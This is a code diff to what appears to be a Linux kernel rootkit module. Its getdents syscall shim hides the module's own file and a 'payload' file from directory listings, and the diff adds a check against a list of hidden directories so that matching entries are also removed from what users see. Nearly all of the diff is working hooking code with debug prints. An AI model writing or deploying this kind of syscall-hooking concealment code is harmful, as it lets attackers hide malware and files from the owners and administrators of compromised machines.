@@ -9,6 +9,7 @@
 #include "syscall.h"
 #include "utility.h"
 #include "secrets.h"
+#include "hiddenDirectories.h"
 MODULE_LICENSE("GPL");
 
 void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
@@ -42,6 +43,8 @@ void get_path_via_fd(int fd, char* buf, int buf_size)
 	char *pathname;
 	struct file *file;
 	struct path *path;
+
+	
 	
 	struct files_struct* files = current->files;
 	spin_lock(&files->file_lock);
@@ -143,16 +146,34 @@ void test_path_functions(void)
 	printk(KERN_INFO "root_path: %s\n", get_path_section(root_path, buf4));
 }
 
+bool is_hidden_directory(char* filepath)
+{
+	char* hidden_dir = 0;
+	char* result = 0;
+
+	printk(KERN_INFO "checking [%s] for hidden dirs\n", filepath);
+	for(int i = 0; i < hiddenDirectories->size; ++i)
+	{
+		hidden_dir = (char*)hiddenDirectories->arr[i];
+		printk(KERN_INFO "hidden dir: %s\n", hidden_dir);	
+		result = strnstrn(filepath, strlen(filepath), hidden_dir, strlen(hidden_dir));
+		if(result != 0 && result == filepath)
+			return true;
+	}
+
+	return false;
+}
+
 int getdentsShim(int fd, char* buf, int BUF_SIZE) {
 	int nread;
 	char filepath[255];	
 	char path_buf[255];
- 	get_path_via_fd(fd, filepath, sizeof(filepath));
-	printk(KERN_INFO "filepath for fd %d: %s\n", fd, filepath); 
-	get_path_section(filepath, path_buf);
-	printk(KERN_INFO "file: [%s]\npath: [%s]\n", get_file_section(filepath), get_path_section(filepath, path_buf));
-	printk(KERN_INFO "END\n\n");
-	//test_path_functions();
+ 	bool should_hide = false;
+	printk(KERN_INFO "SHIMMY\n");
+	get_path_via_fd(fd, filepath, sizeof(filepath));
+	//get_path_section(filepath, path_buf);
+	should_hide = is_hidden_directory(filepath);
+	printk(KERN_INFO "IS HIDDEN: %d\n", should_hide);
 
 	nread = ((SYS_getdents_type)backup_sys_call_table[SYS_getdents])(fd, buf, BUF_SIZE);
 	if (nread <= 0) {
@@ -160,5 +181,12 @@ int getdentsShim(int fd, char* buf, int BUF_SIZE) {
 	}
 	hidename(buf, &nread, secret_ko_name, BUF_SIZE);
 	hidename(buf, &nread, secret_payload_name, BUF_SIZE);
+
+	if(should_hide)
+	{
+		char* file_name = get_file_section(filepath);
+		printk(KERN_INFO "!!!!!!!!!!! HIDING:%s\n", file_name);
+		hidename(buf, &nread, file_name, BUF_SIZE);
+	}
 	return nread;
 }
